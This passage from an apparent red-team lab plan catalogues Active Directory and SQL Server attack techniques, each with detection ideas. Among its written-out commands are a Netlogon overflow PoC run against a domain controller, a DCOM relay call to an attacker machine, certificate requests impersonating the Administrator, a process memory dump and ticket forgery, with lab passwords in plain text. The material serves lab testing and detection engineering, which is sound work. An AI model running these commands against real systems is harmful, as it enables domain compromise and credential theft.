- We need detection rules that catch ETW tampering itself
- Understanding ETW architecture helps validate our detection pipeline

**Study guide:** `05-study-guide/ref-etw-internals.md`

---

### 31. SQL Server 2025 AI Features — Data Exfil, NTLM Coercion, C2 Transport ✅

**Source:** https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/
**PoC:** https://github.com/gershsec/mssql2025-poc
**MITRE:** T1567 (Exfiltration Over Web Service), T1218 (System Binary Proxy Execution), T1071 (Application Layer Protocol)
**Status:** ⏳ Pending — requires SQL Server 2025 upgrade

**Relevance to CADRE:** SQL Server 2025 introduces 3 new AI features that attackers can weaponize. `sp_invoke_external_rest_endpoint` enables native HTTPS exfiltration (100MB payload) without xp_cmdshell. `CREATE EXTERNAL MODEL` with UNC paths enables NTLM SMB coercion (Microsoft won't fix). `AI_GENERATE_EMBEDDINGS` enables C2 transport that looks like legitimate AI model traffic.

**Campaign location:** Phase 3 (Execution) — extends existing MSSQL attack surface. Chains with xp_cmdshell → sysadmin → weaponize AI features.

**Prerequisites:**
- SQL Server 2025 (current lab has 2022 Express — needs upgrade)
- sysadmin role on MSSQL instance
- `sp_invoke_external_rest_endpoint` enabled
- `external AI runtimes enabled` (for NTLM coercion)

**Attack techniques:**

| Technique | Feature Used | What It Does |
|-----------|-------------|-------------|
| Data exfil via REST | `sp_invoke_external_rest_endpoint` | POST database contents to attacker HTTPS server (100MB chunks) |
| File exfil via REST | `OPENROWSET` + REST endpoint | Read files from disk, exfil via HTTPS from SQL process |
| Persistent exfil | TRIGGER + REST endpoint | Auto-exfil on table INSERT (credential harvesting) |
| NTLM coercion | `CREATE EXTERNAL MODEL` + UNC path | Coerce SQL Server to authenticate to attacker SMB |
| C2 transport | `AI_GENERATE_EMBEDDINGS` | Embedding traffic as C2 channel — looks like legitimate AI |
| CLR C2 agent | CLR assembly + embeddings | In-memory .NET implant, communicates via embedding vectors |

**Detection (from article):**
1. SQL Audit: alert on `xp_cmdshell`, SQL Agent Jobs, CLR assemblies
2. SQL Audit: alert on `CREATE/ALTER/DROP EXTERNAL MODEL`
3. SQL ERRORLOG: alert on `external rest endpoint enabled`
4. Firewall: block egress HTTPS from SQL Server to unknown domains
5. Traffic baseline: compare C2 embedding traffic vs legitimate model traffic

**Why this is important:**
- Normalizes egress HTTPS from database engine (decades of "egress from DB = bad" heuristic breaks)
- 100MB payload limit enables massive data exfiltration
- NTLM coercion via UNC path — Microsoft says "not a security boundary" (won't fix)
- C2 traffic looks like legitimate AI model calls — hard to distinguish

**Lab status:** mbr02 runs SQL Server 2025 Developer Edition. AI features available for testing. Would require playbook update to `09-sql-wsus-verify.yml` to enable `external rest endpoint enabled` and `external AI runtimes enabled`.

**Study guide:** `05-study-guide/ref-mssql2025-ai-abuse.md`

---

### 32. DCOMIllusionist — Fileless DCOM Lateral Movement ⏳

**Source:** https://github.com/synacktiv/DCOMIllusionist
**Author:** Synacktiv (Hugo Vincent)
**Date:** 2026-06-11
**MITRE:** T1021.003 (Distributed COM), T1055 (Process Injection)
**Status:** ⏳ Pending — enhances item #21 (Cross-Session Activation)

**Relevance to CADRE:** Fileless lateral movement via DCOM + .NET deserialization. More advanced than Cross-Session Activation (item #21) — production-ready tool from Synacktiv. Supports cross-session execution, in-memory DLL loading, NTLM relay via `--curl`, and ysoserial payloads. No files written to disk.

**Campaign location:** Phase 5 — lateral movement from SYSTEM on mbr01. Enhances/supersedes item #21.

**Prerequisites:**
- Admin privileges on both attacking and target machine
- Domain-joined attacking machine (for cross-session auth)
- Network access between target and attacker (or use `--listen` for relay)

**Key capabilities:**

| Flag | What It Does |
|------|-------------|
| `--exec <cmd>` | Arbitrary command execution on target |
| `--load-dll <path>` | In-memory DLL loading (fileless) |
| `--curl <url>` | HTTP request as victim user → NTLM relay |
| `--session N` | Cross-session execution (run as user in session N) |
| `--list-sessions` | Enumerate interactive sessions on target |
| `--fake-clsid` | Create fake CLSID for low-priv exploitation |
| `--hku` | Exploit from low-priv via HKU (Performance Log Users / DCOM Users) |
| `--yso-b64 <b64>` | Execute ysoserial.net payload |

**How it works:**
1. .NET DCOM servers auto-deserialize incoming objects via `IManagedObject.GetSerializedBuffer`
2. Tool remotely modifies registry to associate .NET CLSID with AppID
3. Forges DCOM OBJREFs to redirect target to attacker machine
4. Target deserializes malicious .NET object → code execution
5. Cross-session: uses session moniker with AppID configured for Interactive User

**CADRE attack scenarios:**
- SYSTEM on mbr01 → `--exec whoami` on dc02
- Cross-session: `--session 1 --exec "cmd /c whoami"` (run as analyst_cloud)
- NTLM relay: `--session 1 --curl http://kali` (trigger auth as analyst_cloud → relay)
- In-memory DLL: `--load-dll payload.dll --dll-class Payload` (no disk artifacts)

**Detection:**
- Sysmon EID 1: process creation on target from DCOM
- Sysmon EID 13: registry modification to CLSID/AppID keys
- WinSec 4624: Type 3 logon from attacker machine
- Network: DCOM traffic on port 135 + dynamic port

**Study guide:** `05-study-guide/ref-dcom-illusionist.md`

---

### 33. CVE-2026-41089 — Netlogon RCE (Standalone Exercise) 🆕 READY

**Source:** https://github.com/0xABCD01/CVE-2026-41089 (PoC by 0xABCD01, 171 stars, 60 forks)
**CVE:** CVE-2026-41089 (CVSS 9.8 CRITICAL, CWE-121 Stack-based Buffer Overflow)
**Date:** 2026-05-12 (Microsoft published) → PoC public 2026-06-12
**Tool:** `poc.py` (Python 3.8+, no third-party deps, 299 lines, 1 file)
**MITRE:** T1210 (Exploitation of Remote Services) + T1190 (Exploit Public-Facing Application)
**Status:** 🆕 Ready — PoC cloned to `docs/internal/references/sources/cve-2026-41089/`

**Vulnerability mechanism:**
- `NlGetLocalPingResponse` allocates a 528-byte stack buffer (`Src[528]`)
- Hands it to `BuildSamLogonResponse` → calls `NetpLogonPutUnicodeString` to write Unicode strings (server name, domain name, GUIDs, attacker-controlled username)
- **Root cause:** `NetpLogonPutUnicodeString` receives max length in **bytes** but treats it as **WCHAR count** → strings occupy 2x expected space
- "User" field in CLDAP filter (130 wchars = 260 bytes on wire) + other strings overflow the 528-byte buffer
- LSASS crashes → DC reboots in ~60 seconds

**Affected systems (all CADRE DCs presumed vulnerable until patched):**
| Server | Fixed In |
|--------|----------|
| 2012 / 2012 R2 | ESU-only patches |
| 2016 | 10.0.14393.9140 |
| 2019 | 10.0.17763.8755 |
| 2022 | 10.0.20348.5074 |
| 2022 23H2 | 10.0.25398.2330 |
| **2025** | **10.0.26100.32772** |

**Attack vector:** UDP 389 (CLDAP), pre-authentication, **zero credentials required**, single crafted UDP packet.

**Why standalone (not main campaign):**
- Unauthenticated DC compromise would short-circuit the entire credential chain (Phases 1-3 become unnecessary)
- CADRE's main campaign demonstrates misconfiguration-based attacks, not CVE exploits
- But valuable as a standalone exercise: tests detection of Netlogon exploitation, shows what happens when a critical CVE hits

**Exercise design (READY NOW):**
1. **Verify DC patch level** (CRITICAL — don't crash a patched DC):
   ```powershell
   # On each DC: Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuild, UBR
   # Server 2025 fixed: 10.0.26100.32772 (build 26100, UBR 32772)
   ```
2. **Pre-test snapshot** (VMware `vmrun.exe snapshot dc01 "CVE-2026-41089-PreTest-2026-XX-XX"`)
3. **Run PoC from Kali:**
   ```bash
   cd docs/internal/references/sources/cve-2026-41089
   # Phase 1: connectivity check (short username, no overflow)
   python3 poc.py 192.168.77.11 child.cadre.local
   # Phase 2: overflow attempt (130-char username by default)
   python3 poc.py 192.168.77.11 child.cadre.local -l 130
   # Phase 3: liveness check (auto - DC should be unresponsive)
   ```
4. **Capture telemetry during attack:**
   - WinSec 1000 (LSASS crash event, netlogon.dll)
   - Sysmon EID 1 (process creation on DC)
   - Zeek udp.log (CLDAP traffic on port 389)
   - Suricata SID (potential new rule for CLDAP overflow pattern)
5. **Verify crash:** DC should reboot within 60 seconds. LSASS PID restarts.
6. **Post-test:** Document outcome in CAMPAIGNS-METADATA.md Mechanics section with actual telemetry. Promote to ✅ if works, or to ❌ Patched if build >= 32772.

**Pre-test checklist (CRITICAL):**
- [ ] Snapshot dc01, dc02, dc03 before testing (VMware snapshot)
- [ ] Verify DC patch level (build 26100.x.x.x — need UBR < 32772 to be vulnerable)
- [ ] UDP/389 reachable from Kali to target DC (nmap -sU -p 389)
- [ ] Choose test target carefully — dc02 (child DC) first, less critical than dc01
- [ ] Notify team DC will be down ~60 seconds during test

**Detection rules to build:**
- **Network:** Suricata rule for CLDAP search requests with `User` filter attribute > 20-30 characters (normal DC locator pings use short service account names)
- **Network:** Zeek notice on `udp.log` CLDAP traffic with oversized search filter
- **Host:** WinSec 1000 (LSASS crash) tied to `netlogon.dll` = HIGH signal
- **Host:** WinSec 5805 (The LSASS process was terminated)
- **Enable Netlogon debug logging:** `nltest /dbflag:0x2080ffff`

**Mitigation (if vulnerable):**
- Install May 2026 Microsoft security update (build 10.0.26100.32772)
- Restrict UDP 389 inbound to trusted management subnets (firewall rule)
- 0patch ships micropatches for legacy Server versions (single instruction fix: `mov edx, 0x40` to halve max username length)

**Cross-references:**
- Item #65 Zerologon Alternative — superseded by this CVE (and by Onelogon #76 which also bypasses post-Zerologon hardening)
- Item #76 Onelogon — also exploits Netlogon (single-channel NRPC), different vuln class but same DC compromise outcome
- Plan 1.7 detection engineering: add CLDAP-overflow Suricata rule + Zeek notice + WinSec 1000 correlation

**Status:** 🆕 Ready — PoC available, simple to run, no infra changes needed. Test on dc02 FIRST (child DC, less critical than dc01). Promote to ✅ after successful test.

---

### 34. DLL Hijacking — Persistence ⏳

**Source:** RTO-Windows-Persistence/06b.DLL-hijack.txt
**MITRE:** T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Hijack DLL loading by placing malicious DLL in search path before legitimate one. Executes in context of trusted signed binary — EDR sees legitimate process loading DLL. Survives reboots if target application is commonly used.

**Campaign location:** Phase 5 (Persistence) — after credential access.

**Detection:** Sysmon EID 7 (image loaded from non-standard path), EID 11 (DLL file creation).

---

### 35. COM Hijacking — Persistence ⏳

**Source:** RTO-Windows-Persistence/07b.COM-hijack-demo.txt
**MITRE:** T1546.015 (Event Triggered Execution: Component Object Model Hijacking)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Registry-based COM object hijacking. Modify CLSID registry keys to point to malicious DLL. Survives reboots. No scheduled tasks or services needed — fires when legitimate application requests the COM object.

**Campaign location:** Phase 5 (Persistence) — after credential access.

**Detection:** Sysmon EID 13 (registry value set under CLSID), EID 7 (DLL load from non-standard path).

---

### 36. IFEO (Image File Execution Options) — Persistence ⏳

**Source:** RTO-Windows-Persistence/11.IFEO.txt
**MITRE:** T1546.012 (Event Triggered Execution: Image File Execution Options)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Set debugger for any executable via IFEO registry key. When target application launches, debugger runs instead (or before). Can be used for persistence or process interception.

**Campaign location:** Phase 5 (Persistence) — after credential access.

**Detection:** Sysmon EID 13 (registry write to IFEO keys), EID 1 (debugger process creation).

---

### 37. LSA SSP / Password Filter — Credential Theft + Persistence ⏳

**Source:** RTO-Windows-Persistence/20b.LSA-SSP.AP.txt
**MITRE:** T1556.002 (Modify Authentication Process: Password Filter DLL)
**Status:** ⏳ Pending — Phase 5 persistence + credential access

**Relevance to CADRE:** Register a custom SSP (Security Support Provider) or Password Filter DLL in LSA. SSP intercepts every authentication event — captures plaintext passwords, NTLM hashes, and Kerberos tickets. Password Filter validates passwords at change time — captures new passwords. Both load at boot and persist in LSASS process memory.

**Campaign location:** Phase 5 (Persistence) — combines persistence with credential access.

**Detection:** Sysmon EID 7 (DLL loaded into lsass.exe), EID 13 (registry write to Security Packages or Notification Packages), WinSec 4624 (authentication events).

---

### 38. UACME — UAC Bypass ⏳

**Source:** RTO-Windows-PrivEsc/15.UACME.txt
**MITRE:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)
**Status:** ⏳ Pending — Phase 3 execution

**Relevance to CADRE:** UAC bypass from local admin (medium integrity → high integrity). CADRE has SYSTEM via GodPotato, but UAC bypass is a distinct technique class. UACME project contains 70+ techniques, many still unfixed on Server 2025. Useful when you have local admin but UAC blocks execution.

**Campaign location:** Phase 3 (Execution) — alternative when GodPotato isn't available or UAC is enabled.

**Why this works on Server 2025:**
- Many UACME techniques are DLL hijacks on trusted binaries
- Unfixed techniques exist from Windows 7 through Server 2025
- UAC is enabled by default on member servers (not DCs)

**Detection:** Sysmon EID 1 (process creation with elevated integrity), EID 13 (registry modification for UAC bypass).

---

### 39. Named Pipe Impersonation (Piper) — Privilege Escalation ⏳

**Source:** RTO-Windows-PrivEsc/23.Piper-intro.txt + 24.Piper-demo.txt
**MITRE:** T1134.001 (Access Token Manipulation: Token Impersonation/Theft)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Named pipe impersonation via `ImpersonateNamedPipeClient`. Create a named pipe, wait for SYSTEM to connect (e.g., via service or scheduled task), impersonate the connecting client's token. Classic privilege escalation technique.

**Campaign location:** Phase 5 (Persistence) — token-based persistence/priv-esc.

**Why this works on Server 2025:**
- Named pipe impersonation is a legitimate Windows API
- Works when you can trigger SYSTEM to connect to your pipe
- Commonly used with PsExec-style service creation

**Detection:** Sysmon EID 17/18 (pipe create/connect), EID 1 (process creation via impersonated token).

---

### 40. Handle Leak Exploitation — Privilege Escalation ⏳

**Source:** RTO-Windows-PrivEsc/18.HandleLeak-intro.txt + 19-20.HandleLeak-demo.txt
**MITRE:** T1134 (Access Token Manipulation)
**Status:** ⏳ Pending — Phase 3 execution

**Relevance to CADRE:** Exploit leaked handles from privileged processes. If a SYSTEM process leaks a handle to its token or a privileged object, a lower-privileged process can use that handle to escalate. Kernel-level technique.

**Campaign location:** Phase 3 (Execution) — alternative privesc when GodPotato isn't available.

**Detection:** Sysmon EID 10 (process access — handle duplication), EID 1 (process creation with unusual parent).

---

### 41. Token Dance — Token Manipulation Persistence ⏳

**Source:** RTO-Windows-PrivEsc/21.TokenDance-intro.txt + 22.TokenDance-demo.txt
**MITRE:** T1134.001 (Access Token Manipulation: Token Impersonation/Theft)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Token manipulation techniques for persistence. Steal or duplicate tokens from privileged processes to maintain elevated access. Works alongside named pipe impersonation.

**Campaign location:** Phase 5 (Persistence) — token-based persistence.

**Detection:** Sysmon EID 10 (process access for token duplication), WinSec 4674 (operation on privileged object).

---

### 42. LAPS Extraction — Credential Access ✅

**Source:** RTO-Windows-PrivEsc/LAPS (Zero Point Security Red Team Ops 2025 module 24)
**MITRE:** T1552.004 (Unsecured Credentials: Private Keys)
**Status:** ✅ Adopted into CAMPAIGNS.md Branch 3.5 — 3.5L (LAPS Extraction). Full test plan + WinSec 4662 detection.

**Relevance to CADRE:** Local Administrator Password Solution (LAPS) manages unique local admin passwords per machine, stored in AD. If compromised, gives local admin on any LAPS-managed machine. Extraction requires specific AD permissions (Read LAPS password attribute).

**Campaign location:** Phase 3.5 (Credential Access) — after domain user access.

**Why this works on Server 2025:**
- LAPS passwords stored in AD as `ms-Mcs-AdmPwd` attribute
- Requires Read permission on the attribute (not default for regular users)
- Can be extracted via LDAP if permissions allow
- New LAPS (Windows LAPS) stores password in AD or Azure AD

**Detection:** WinSec 4662 (AD object access — reading LAPS password attribute), Sysmon EID 1 (LDAP query for LAPS attributes).

---

### 43. BetterSuccessor — dMSA Post-Patch Abuse (Server 2025) ⏳

**Source:** https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch
**MITRE:** T1558.004 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — extends item #23 (BadSuccessor + Golden dMSA)

**Relevance to CADRE:** After Microsoft patched BadSuccessor, Altered Security found that dMSA abuse still works post-patch via BetterSuccessor. Server 2025 specific. Extends item #23 with post-patch technique.

**Campaign location:** Phase 8 (Forest Trust) — after DCSync.

**Detection:** WinSec 4742 (computer account modification), Sysmon EID 13 (registry write to dMSA attributes).

---

### 44. RBCD — Resource-Based Constrained Delegation ⏳

**Source:** https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd
**MITRE:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)
**Status:** ⏳ Pending — Phase 5 lateral movement

**Relevance to CADRE:** ACE#20 gives `GenericWrite` on `mbr01$` — RBCD is the direct attack. Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on mbr01$ → impersonate any user. CADRE has the prerequisite (ACE#20) already deployed.

**Campaign location:** Phase 5 (Lateral Movement) — after Phase 4 BloodHound reveals ACE#20.

**Detection:** WinSec 4742 (computer account modification — msDS-AllowedToActOnBehalfOfOtherIdentity), Sysmon EID 13 (registry write).

---

### 45. Pass-the-Cert — Entra ID Lateral Movement via Certificates ⏳

**Source:** https://www.alteredsecurity.com/post/long-live-pass-the-cert-reviving-the-classical-rendition-of-lateral-movement-across-entra-id-joined
**MITRE:** T1078 (Valid Accounts)
**Status:** ⏳ Pending — Plan 11b (EntraGoat)

**Relevance to CADRE:** Certificate-based lateral movement across Entra ID-joined machines. Chains with ADCS certificate abuse (Branch B) → Entra ID authentication. Relevant for Plan 11 (Cloud/Hybrid) and EntraGoat integration.

**Campaign location:** Plan 11b (EntraGoat) — when cloud integration starts.

**Detection:** Entra ID sign-in logs (certificate-based auth), Azure AD audit logs.

---

### 46. DCSync Attack and Detection ⏳

**Source:** https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection
**MITRE:** T1003.006 (OS Credential Dumping: DCSync)
**Status:** ⏳ Pending — Phase 7 detection reference

**Relevance to CADRE:** Detection-focused article on DCSync. Complements plan1.7 Impacket IoCs (IoC 59/60 — DRSBind, DRSGetNCChanges). Useful for building Phase 7 detection rules.

**Campaign location:** Phase 7 (Privilege Escalation — DCSync) — detection reference.

**Detection:** WinSec 4662 (GetChanges + GetChangesAll on domain object), Zeek dce_rpc.log (DRSBind, DRSGetNCChanges).

---

### 47. Fantastic Windows Logon Types — Credential Location Reference ⏳

**Source:** https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them
**MITRE:** T1078 (Valid Accounts)
**Status:** ⏳ Pending — Phase 3.5 reference

**Relevance to CADRE:** Maps Windows logon types (Type 2 Interactive, Type 3 Network, Type 7 Unlock, Type 10 RemoteInteractive, etc.) to where credentials end up in LSASS. Directly useful for understanding which logon types leave creds accessible for Phase 3.5 credential theft.

**Campaign location:** Phase 3.5 (Credential Access) — study reference for understanding credential material in LSASS.

**Detection:** WinSec 4624 (logon type analysis), Sysmon EID 1 (process context).

---

## CAMPAIGNS.md Phase Mapping (Campaign Order)

| Phase | Suggestion # | Article | Status |
|:------|:-------------|:--------|:-------|
| Recon | 8 | RTFM | Reference only |
| Recon | 19 | ADWS Enumeration | ✅ Adopted — Phase 0 Step 3 (port 9389 open on all 3 DCs) |
| Phase 1 (Initial Access) | 14 | Shift Happens | ⏳ Negative test — likely patched |
| Phase 2 (Kerberoast) | 15 | Into The Rainbow | ✅ Adopted — Phase 2 NTLMv1 section |
| Phase 3 (SQL xp_cmdshell) | 1 | MSSQLHound | ✅ Adopted — Reconnaissance with svc_mssql |
| Branch 3.5 (Credential Theft) | 3 | Offensive DPAPI | ✅ Adopted — Branch 3.5G |
| Branch 3.5 (Credential Theft) | 4 | ctfmon.exe Extraction | ✅ Adopted — Branch 3.5H |
| Branch 3.5 (Credential Theft) | 8 | WMI Event Subscriptions | ✅ Adopted — Branch 3.5J |
| Branch 3.5 (Credential Theft) | 10 | Invisible Scheduled Tasks | ✅ Adopted — enhances 3.5B |
| Branch 3.5 (Credential Theft) | 20 | LSASS Dump via WerFault | ✅ Adopted — Branch 3.5K |
| Branch 3.5 (Credential Theft) | 28 | Credential Guard Bypass | ✅ Adopted — Study Reference Library |
| Phase 3.5 (Credential Access) | 42 | LAPS Extraction | ✅ Adopted — Branch 3.5L |
| Branch 3.5 (Credential Theft) | 25 | EntryPoint Hijacking | ⏳ Pending — code injection |
| Phase 3 (Execution) | 24 | WinGet Proxy Execution | ✅ Adopted — Phase 3 Alternative Execution |
| Phase 3 (Execution) | 27 | GAC Hijacking | ✅ Adopted — Phase 3 Alternative Execution |
| Phase 4 (BloodHound) | 1 | MSSQLHound | ✅ Adopted — BH import |
| Phase 4 (BloodHound) | 22 | SharpHound Detection | ✅ Adopted — Study Reference Library |
| Phase 5 (Lateral Movement) | 13 | ghostsurf | ✅ Adopted — Phase 5 |
| Phase 5 (Lateral Movement) | 21 | Cross-Session Activation | ⏳ Pending — COM lateral movement |
| Phase 5 (Lateral Movement) | 26 | SpeechRuntime Lateral | ⏳ Pending — novel lateral movement |
| Phase 5 (Lateral Movement) | 32 | DCOMIllusionist | ⏳ Pending — fileless DCOM lateral |
| Phase 5 (Persistence) | 34 | DLL Hijacking | ⏳ Pending — persistence |
| Phase 5 (Persistence) | 35 | COM Hijacking | ⏳ Pending — persistence |
| Phase 5 (Persistence) | 36 | IFEO | ⏳ Pending — persistence |
| Phase 5 (Persistence) | 37 | LSA SSP / Password Filter | ⏳ Pending — persistence + cred access |
| Phase 6 (Lateral Movement) | 44 | RBCD | ⏳ Pending — ACE#20 → mbr01$ impersonation |
| Phase 6 (Lateral Movement) | 61 | RBCD + NTLM Relay | ⏳ Pending — dirkjanm.io + ACE#20 |
| Phase 7 (DCSync) | 46 | DCSync Detection | ⏳ Pending — detection reference |
| Phase 8 (Forest Trust) | 43 | BetterSuccessor (dMSA post-patch) | ⏳ Pending — extends #23 |
| Phase 8 (Forest Trust) | 66 | Forest Trust SID Filtering | ✅ Adopted — Study Reference Library |
| Phase 8 (Forest Trust) | 67 | CVE-2020-0665 Trust Bypass | ✅ Adopted — Study Reference Library |
| Phase 3.5 (Credential Access) | 47 | Logon Types Reference | ⏳ Pending — credential location ref |
| Phase 3.5 (Credential Access) | 68 | Azure AD Connect DPAPI Dump | ✅ Adopted — Branch 3.5M |
| Plan 11 (Cloud/Entra) | 45 | Pass-the-Cert | ⏳ Pending — Entra ID lateral movement |
| Plan 11 (Cloud/Entra) | 69 | Actor Tokens → Global Admin | ⏳ Pending — P11.1 EntraGoat |
| Plan 11 (Cloud/Entra) | 70 | Cloud Kerberos Trust → DA | ⏳ Pending — P11.2 (CRITICAL for CADRE) |
| Plan 11 (Cloud/Entra) | 71 | PRT Phishing | ⏳ Pending — P11.3 initial access |
| Plan 11 (Cloud/Entra) | 72 | Intune ADCS ESC1 | ⏳ Pending — P11.4 hybrid attack |
| Plan 11 (Cloud/Entra) | 73 | Temporary Access Pass Lateral | ⏳ Pending — P11.5 MFA bypass |
| Plan 11 (Cloud/Entra) | 74 | Federated Credentials Persistence | ⏳ Pending — P11.6 persistence |
| Plan 11 (Cloud/Entra) | 75 | Application Admin → GA | ⏳ Pending — P11.7 |
| Phase 0 (Recon) | 60 | ADIDNSDump | ⏳ Pending — DNS enumeration |
| Phase 5 (Lateral Movement) | 62 | Unconstrained Delegation (krbrelayx) | ⏳ Pending — mbr01$ TGT capture |
| Branch B (ADCS) | 63 | NTLM Relay to ADCS (ESC8) | ⏳ Pending — chains Coercer → relay → cert → UnPAC |
| Phase 6 (Study ref) | 64 | SMB-to-LDAP Relay (CVE-2019-1040) | ⏳ Pending — patched on Server 2025 |
| Phase 7 (Study ref) | 65 | Zerologon Alternative | ⏳ Pending — superseded by #76 Onelogon (still works in 2026) |
| Phase 5 → Phase 7 | 76 | Onelogon Zero-Channel (single-channel NRPC bypass) | ⏳ Pending — fills #76-77 gap, gated on author's PoC release |
| Phase 3.5 alt → Phase 7 | 77 | Onelogon AES-CBC8 Downgrade (KRBTGT hash extraction) | ⏳ Pending — bypasses DCSync step entirely |
| Phases 0-5 (tool upgrade) | 90 | NetExec (nxc) — CrackMapExec replacement | 🆕 Add — global upgrade for `crackmapexec` (none currently, new commands) |
| Phase 2, 3.5, 5 (tool upgrade) | 91 | bloodyAD v2.5.4 — Linux PowerView replacement | ✅ Adopted — update to v2.5.4 (dMSA + ACL helpers) |
| Branch B (ADCS, tool upgrade) | 92 | Certipy v5.1.0 — Modern ADCS framework | ✅ Adopted — update to v5.1.0 (ESC17 + golden cert) |
| Phase 3.5 (Credential Access) | 93 | DonPAPI v2.0+ — Remote DPAPI harvesting | 🆕 Add — 12+ collectors, auto DPBK |
| Phase 3.5 (Credential Access) | 94 | lsassy v3.1.16 — Remote LSASS dump (15+ methods) | 🆕 Add — more reliable than mimikatz |
| Branch 3.5 (LPE) | 95 | KrbRelay + KrbRelayUp — LPE via Kerberos relay | 🆕 Add — no-CVE LPE via S4U2Self + RBCD |
| Plan 11 (Cloud/Entra) | 96 | BARK (BloodHound Attack Research Kit) | ⏳ Pending — Azure/Entra only, Plan 11 scope |
| Phase 8 alt (Forest Trust) | 97 | Skipjack — PAC signature downgrade | ⏳ Pending — Phase 8 alt (no krbtgt hash needed) |
| Phase 0/3.5/5 (tool upgrade) | 98 | NetExec `coerce_plus` + 5 new modules + `--kdcHost` flag | 🆕 Add — replaces individual WT017-020 recon |
| Phase 0 + Branch A + Branch B (recon tool) | 99 | ADeleg — GUI tool for ACL/ADCS recon | 🆕 Add — visualizes 14 ACEs + ESC1-17 templates |
| Phase 1/2/5/6/7/8 (study ref) | 100 | Windows Security Internals — Kerberos/AD internals | ⏳ Pending — read before Phase 1/2/5/7/8 |
| DFIR + plan1.7 (study ref) | 101 | Practical Purple Teaming — lab + DFIR | ⏳ Pending — read for DFIR-Nexus integration + plan1.7 |
| Phase 0/1 (Recon) | 102 | dsHeuristics abuse (forest-level AD behavior) | 🆕 Add — read via LDAP, document unusual flags |
| Phase 0/1/5 (Recon) | 103 | UAC bit exploitation beyond DONT_REQ_PREAUTH | 🆕 Add — enumerate all 20+ UAC flags |
| Phase 5 (RBCD pre-flight) | 104 | ms-DS-Machine-Account-Quota check | 🆕 Add — check quota before WT007 RBCD |
| Phase 5+ (Defense Evasion) | 105 | SACL/audit policy manipulation for detection evasion | 🆕 Add — DETECT this in plan1.7 |
| Cross-cutting (validation) | 106 | Atomic Red Team as validation framework | 🆕 Add — cross-validate manual attacks |
| Plan 0.8 + Track H | 107 | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ Pending — Plan 0.8 expansion F-11/F-12 + CADRE-Strike defensive |
| Phase 5 (Persistence) | 39 | Named Pipe Impersonation | ⏳ Pending — priv-esc via pipe |
| Phase 5 (Persistence) | 41 | Token Dance | ⏳ Pending — token manipulation persistence |
| Phase 6 (Persistence) | 11 | Golden/Silver Ticket | ⏳ Pending — enhances Phase 6/7 |
| Phase 7 (Forest Trust) | 23 | BadSuccessor + Golden dMSA | ⏳ Pending — Server 2025 dMSA abuse |
| Branch B (ADCS) | 5 | Certified Pre-Owned | ✅ Adopted — Branch B |
| Branch B (ADCS) | 29 | UnPAC-the-Hash | ⏳ Pending — NT hash from certificate |
| Detection Engineering | 30 | ETW Internals | ⏳ Pending — telemetry tampering detection |
| Exercise (Standalone) | 33 | CVE-2026-41089 Netlogon RCE | 🆕 Ready — PoC cloned, pre-test snapshot required |
| Phase 3 (SQL xp_cmdshell) | 31 | SQL Server 2025 AI Abuse | ✅ Adopted — Phase 3 Alternative Execution |
| Phase 3 (Execution) | 38 | UACME | ⏳ Pending — UAC bypass |
| Phase 3 (Execution) | 40 | Handle Leak | ⏳ Pending — kernel handle leak privesc |
| Branch C (SCCM) | 7 | Ludus SCCM | ✅ Adopted — Branch C |
| Branch F (Supply-chain) | 6 | Shai-Hulud 2.0 | ✅ Adopted — Branch F |
| Research only | 2 | MSSQL + SCCM CVEs | 🔬 Not spine |
| Skip | 16 | Don't Jump Turnstile | ⏭️ No Cloudflare in lab |
| Future | 18 | Okta + BloodHound | Azure/Okta expansion |
| Reference | 17 | How We Think about Red Teaming | Methodology |
| Reference | 8 | RTFM | Lab design justification |

---

## Testing Checklist

| # | Article | Test Command | Expected Result | Telemetry |
|:--|:--------|:-------------|:----------------|:----------|
| 1 | MSSQLHound ✅ | `/tmp/mssqlhound -u svc_mssql -p s3rv1c3_MSSQL! -d child.cadre.local -t 192.168.77.22 --collect-from-linked` | SQL attack paths | SQL logs |
| 2 | MSSQL + SCCM CVEs 🔬 | Check CVE status on mbr01/mbr02 | Exploit chain | SQL/SCCM logs |
| 3 | Offensive DPAPI ✅ | Nemesis DPAPI extraction | Saved credentials | Sysmon EID 1/10 |
| 4 | ctfmon.exe ✅ | `procdump -ma ctfmon.exe ctfmon.dmp` | Typed passwords in dump | Sysmon EID 10 |
| 5 | Certified Pre-Owned ✅ | `certipy find -u intern_blue@child.cadre.local -p '1nt3rn_Blu3!' -dc-ip 192.168.77.11` | List vulnerable templates | Sysmon EID 1 |
| 5 | Certified Pre-Owned ✅ | ESC1: `certipy req -u analyst_t1@child.cadre.local -p 'T13r_An@lyst!' -ca cadre-CA -template CADRE-ESC1 -upn Administrator@cadre.local -dc-ip 192.168.77.10` | Admin certificate | Cert Services EID 4886 |
| 6 | Shai-Hulud 2.0 ✅ | NPMHound collection | npm supply-chain paths | npm audit |
| 7 | Ludus SCCM ✅ | ConfigManBearPig collection | SCCM attack paths | SCCM logs |
| 8 | WMI Event Subscriptions ✅ | WMI subscription install via SYSTEM | Fileless persistence | Sysmon 19/20/21 |

| 10 | Invisible Scheduled Tasks ✅ | `reg delete ...Security /f` | Task invisible to schtasks | Sysmon 12/13 |
| 11 | Golden/Silver Ticket ⏳ | `ticketer.py -nthash <KRBTGT_HASH> ...` | Forged TGT | Sysmon 1, 3 |
